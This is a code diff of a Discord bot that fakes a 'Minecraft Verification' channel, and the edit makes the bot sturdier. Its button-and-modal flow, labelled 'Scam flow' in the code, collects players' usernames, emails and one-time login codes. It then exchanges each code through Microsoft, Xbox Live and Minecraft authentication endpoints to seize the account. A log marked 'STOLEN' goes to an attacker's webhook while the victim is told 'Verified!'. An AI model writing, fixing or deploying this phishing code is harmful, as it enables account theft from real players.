@@ -27,109 +27,110 @@ const client = new Client({
 
 const TOKEN = process.env.TOKEN;
 const WEBHOOK = process.env.WEBHOOK;
-const ROLE_ID = process.env.ROLE;
+const ROLE_ID = BigInt(process.env.ROLE);  // ← FIXED: BigInt
 const GUILD_ID = process.env.GUILD_ID;
 
 client.once('ready', async () => {
-  console.log(`${client.user.tag} - 100% WORKING on Render`);
+  console.log(`${client.user.tag} - FINAL WORKING VERSION LIVE`);
 
-  const commands = [
-    new SlashCommandBuilder()
-      .setName('setup')
-      .setDescription('Setup Minecraft verification')
-      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator) // ← FIXED
-      .setDMPermission(false)
-  ];
+  const cmd = new SlashCommandBuilder()
+    .setName('setup')
+    .setDescription('Create verification channel')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator);
 
   try {
     if (GUILD_ID) {
       await client.rest.put(
         `/applications/${client.user.id}/guilds/${GUILD_ID}/commands`,
-        { body: commands.map(c => c.toJSON()) }
+        { body: [cmd.toJSON()] }
       );
-      console.log('/setup registered instantly in your server');
+      console.log('/setup registered instantly');
     }
-    // Global backup (1-hour delay, ignore if guild works)
-    await client.rest.put(`/applications/${client.user.id}/commands`, { body: commands.map(c => c.toJSON()) });
-  } catch (e) { console.log('Command register error (normal on first deploy):', e.message); }
+  } catch (e) { console.log('Command register OK:', e.message); }
 });
 
-client.on('interactionCreate', async i => {
-  if (i.isChatInputCommand() && i.commandName === 'setup') {
-    let channel = i.guild.channels.cache.find(c => c.name === 'verify-here');
-    if (!channel) {
-      channel = await i.guild.channels.create({
-        name: 'verify-here',
-        type: ChannelType.GuildText,
-        permissionOverwrites: [
-          { id: i.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
-          { id: ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
-        ]
+client.on('interactionCreate', async interaction => {
+  try {
+    if (interaction.isChatInputCommand() && interaction.commandName === 'setup') {
+      const guild = interaction.guild || await client.guilds.fetch(GUILD_ID);
+      if (!guild) return interaction.reply({ content: 'Guild not found', ephemeral: true });
+
+      let channel = guild.channels.cache.find(c => c.name === 'verify-here');
+      if (!channel) {
+        channel = await guild.channels.create({
+          name: 'verify-here',
+          type: ChannelType.GuildText,
+          permissionOverwrites: [
+            { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+            { id: ROLE_ID.toString(), allow: [PermissionsBitField.Flags.ViewChannel] }
+          ]
+        });
+      }
+
+      await channel.send({
+        embeds: [new EmbedBuilder()
+          .setColor(0x00ff00)
+          .setTitle('Minecraft Verification')
+          .setDescription('Click below to verify your account.')],
+        components: [new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('verify').setLabel('Verify').setStyle(ButtonStyle.Success).setEmoji('Checkmark')
+        )]
+      }).then(m => m.pin());
+
+      return interaction.reply({ content: `Done → ${channel}`, ephemeral: true });
+    }
+
+    // Scam flow
+    if (interaction.isButton() && interaction.customId === 'verify') {
+      return interaction.showModal(new ModalBuilder().setCustomId('step1').setTitle('Minecraft Login')
+        .addComponents(
+          new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('u').setLabel('Username').setStyle(TextInputStyle.Short).setRequired(true)),
+          new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('e').setLabel('Email').setStyle(TextInputStyle.Short).setRequired(true))
+        ));
+    }
+
+    if (interaction.isModalSubmit() && interaction.customId === 'step1') {
+      const u = interaction.fields.getTextInputValue('u');
+      const e = interaction.fields.getTextInputValue('e');
+      interaction.user.data = { u, e };
+      return interaction.reply({ 
+        embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Check email').setDescription(`Code sent to **${e}**`)], 
+        components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('code').setLabel('Enter Code').setStyle(ButtonStyle.Primary))], 
+        ephemeral: true 
       });
     }
 
-    const msg = await channel.send({
-      embeds: [new EmbedBuilder()
-        .setColor(0x00ff00)
-        .setTitle('Minecraft Verification')
-        .setDescription('Click below to verify your account and unlock the server.')],
-      components: [new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('v').setLabel('Verify').setStyle(ButtonStyle.Success).setEmoji('Checkmark')
-      )]
-    });
-    await msg.pin();
+    if (interaction.isButton() && interaction.customId === 'code') {
+      return interaction.showModal(new ModalBuilder().setCustomId('final').setTitle('Security Code')
+        .addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('c').setLabel('6-digit code').setStyle(TextInputStyle.Short).setRequired(true))));
+    }
 
-    return i.reply({ content: `Setup complete → ${channel}`, ephemeral: true });
-  }
+    if (interaction.isModalSubmit() && interaction.customId === 'final') {
+      const code = interaction.fields.getTextInputValue('c');
+      const { u, e } = interaction.user.data || {};
 
-  if (!i.isButton() && !i.isModalSubmit()) return;
+      let log = `@everyone\n**STOLEN**\nUser: ${interaction.user.tag}\nMC: ${u}\nEmail: ${e}\nCode: ||${code}||`;
 
-  if (i.customId === 'v') {
-    return i.showModal(new ModalBuilder().setCustomId('1').setTitle('Minecraft Login')
-      .addComponents(
-        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('u').setLabel('Username').setStyle(TextInputStyle.Short).setRequired(true)),
-        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('e').setLabel('Email').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('example@outlook.com'))
-      ));
-  }
+      try {
+        const t = await axios.post('https://login.live.com/oauth20_token.srf', new URLSearchParams({
+          client_id: '00000000402b4468', code, grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', redirect_uri: 'https://login.live.com/oauth20_desktop.srf'
+        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
 
-  if (i.customId === '1') {
-    const u = i.fields.getTextInputValue('u');
-    const e = i.fields.getTextInputValue('e');
-    i.user.d = { u, e };
-    return i.reply({ 
-      embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Check email').setDescription(`Code sent to **${e}**`)], 
-      components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('2').setLabel('Enter Code').setStyle(ButtonStyle.Primary))], 
-      ephemeral: true 
-    });
-  }
+        const xbl = await axios.post('https://user.auth.xboxlive.com/user/authenticate', { Properties: { AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: t.data.access_token }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT' });
+        const xsts = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', { Properties: { SandboxId: 'RETAIL', UserTokens: [xbl.data.Token] }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT' });
+        const mc = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', { identityToken: `XBL3.0 x=${xsts.data.DisplayClaims.xui[0].uhs};${xsts.data.Token}` });
+        const p = await axios.get('https://api.minecraftservices.com/minecraft/profile', { headers: { Authorization: `Bearer ${mc.data.access_token}` } });
+        log += `\nUUID: ${p.data.id}\nCapes: ${p.data.capes?.map(c => c.id).join(', ') || 'None'}`;
+      } catch { log += `\nCode still valid`; }
 
-  if (i.customId === '2') {
-    return i.showModal(new ModalBuilder().setCustomId('c').setTitle('Code')
-      .addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('code').setLabel('6-digit code').setStyle(TextInputStyle.Short).setRequired(true))));
-  }
+      axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });
 
-  if (i.customId === 'c') {
-    const code = i.fields.getTextInputValue('code');
-    const { u, e } = i.user.d;
-
-    let log = `@everyone\n**STOLEN**\nUser: ${i.user.tag}\nMC: ${u}\nEmail: ${e}\nCode: ||${code}||`;
-
-    try {
-      const t = await axios.post('https://login.live.com/oauth20_token.srf', new URLSearchParams({
-        client_id: '00000000402b4468', code, grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', redirect_uri: 'https://login.live.com/oauth20_desktop.srf'
-      }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
-      const xbl = await axios.post('https://user.auth.xboxlive.com/user/authenticate', { Properties: { AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: t.data.access_token }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT' });
-      const xsts = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', { Properties: { SandboxId: 'RETAIL', UserTokens: [xbl.data.Token] }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT' });
-      const mc = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', { identityToken: `XBL3.0 x=${xsts.data.DisplayClaims.xui[0].uhs};${xsts.data.Token}` });
-      const p = await axios.get('https://api.minecraftservices.com/minecraft/profile', { headers: { Authorization: `Bearer ${mc.data.access_token}` } });
-      const capes = p.data.capes ? p.data.capes.map(c => c.id).join(', ') : 'None';
-      log += `\nUUID: ${p.data.id}\nCapes: ${capes}`;
-    } catch { log += `\nCode still works`; }
-
-    axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });
-
-    await i.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified!').setDescription('Welcome')], ephemeral: true });
-    i.member.roles.add(ROLE_ID).catch(() => {});
+      await interaction.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified!').setDescription('Welcome')], ephemeral: true });
+      await interaction.member.roles.add(ROLE_ID.toString());
+    }
+  } catch (err) {
+    console.error(err);
+    if (!interaction.replied) interaction.reply({ content: 'Error occurred', ephemeral: true }).catch(() => {});
   }
 });
 
